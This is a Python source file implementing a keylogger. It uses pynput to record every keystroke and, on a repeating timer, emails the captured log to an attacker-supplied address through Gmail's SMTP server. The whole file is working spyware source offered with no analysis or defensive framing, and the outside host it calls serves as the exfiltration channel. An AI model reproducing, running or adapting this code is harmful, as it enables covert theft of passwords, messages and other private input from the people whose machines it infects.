import pynput
import threading
import smtplib
import ssl

log = ""
class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password
        self.context = ssl.create_default_context()
    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465, context= self.context) 
        server.login(email, password) 
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_Listener = pynput.keyboard.Listener(on_press = self.process_key_press)
        with keyboard_Listener:
                self.report()
                keyboard_Listener.join()
        